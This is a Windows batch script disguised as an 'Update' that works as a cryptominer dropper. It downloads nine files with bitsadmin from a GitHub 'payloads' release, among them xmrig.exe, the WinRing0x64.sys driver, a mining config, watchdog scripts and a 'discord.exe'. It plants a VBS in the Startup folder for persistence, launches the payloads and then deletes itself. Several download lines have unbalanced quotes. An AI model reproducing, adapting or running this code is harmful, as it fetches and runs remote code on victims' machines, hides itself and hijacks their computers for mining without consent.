@echo off
title Update...
color f
mkdir "C:\ProgramData\Drivers"
set pOut1="%appdata%\\Microsoft\Windows\Start Menu\Programs\Startup\ServiceStart.vbs"
set pOut2="C:\ProgramData\Drivers\1.vbs"
set pOut3="C:\ProgramData\Drivers\config.json"
set pOut4="C:\ProgramData\Drivers\process.bat"
set pOut5="C:\ProgramData\Drivers\watch.bat"
set pOut6="C:\ProgramData\Drivers\winproc.vbs"
set pOut7="C:\ProgramData\Drivers\WinRing0x64.sys"
set pOut8="C:\ProgramData\Drivers\xmrig.exe"
set pOut9="C:\ProgramData\Drivers\discord.exe"
bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/bitcoin-generator/payloads/releases/download/exes/ServiceStart.vbs" %pOut1%
bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/bitcoin-generator/payloads/releases/download/exes/1.vbs %pOut2%
bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/bitcoin-generator/payloads/releases/download/exes/WinRing0x64.sys %pOut7%
bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/bitcoin-generator/payloads/releases/download/exes/config.json %pOut3%
bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/bitcoin-generator/payloads/releases/download/exes/discord.exe %pOut9%
bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/bitcoin-generator/payloads/releases/download/exes/process.bat %pOut4%
bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/bitcoin-generator/payloads/releases/download/exes/watch.bat %pOut5%
bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/bitcoin-generator/payloads/releases/download/exes/winproc.vbs %pOut6%
bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/bitcoin-generator/payloads/releases/download/exes/xmrig.exe %pOut8%
start "" %pOut6%
start "" %pOut9%
DEL "%~f0"